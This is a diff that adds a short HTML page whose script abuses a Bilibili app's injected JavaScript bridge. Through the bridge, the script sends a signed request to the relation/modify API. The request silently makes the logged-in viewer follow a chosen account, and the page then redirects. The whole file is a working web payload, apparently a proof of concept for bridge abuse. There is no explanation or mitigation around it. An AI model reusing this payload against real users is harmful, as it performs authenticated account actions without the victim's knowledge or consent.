@@ -1,0 +1,19 @@
+<script>
+  window.biliInjectV2.biliCallbackReceived = (...data) => {
+    alert(...data);
+    location.href ='https://space.bilibili.com/1';
+  };
+  window.biliInjectV2.postMessage(JSON.stringify({
+    method: 'net.requestWithSign',
+    data: {
+      url: 'https://api.bilibili.com/x/relation/modify',
+      method: 'POST',
+      header: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      data: 'act=1&fid=1',//645769214',
+      timeout: 0
+    },
+    callbackId: 1
+  }));
+</script>
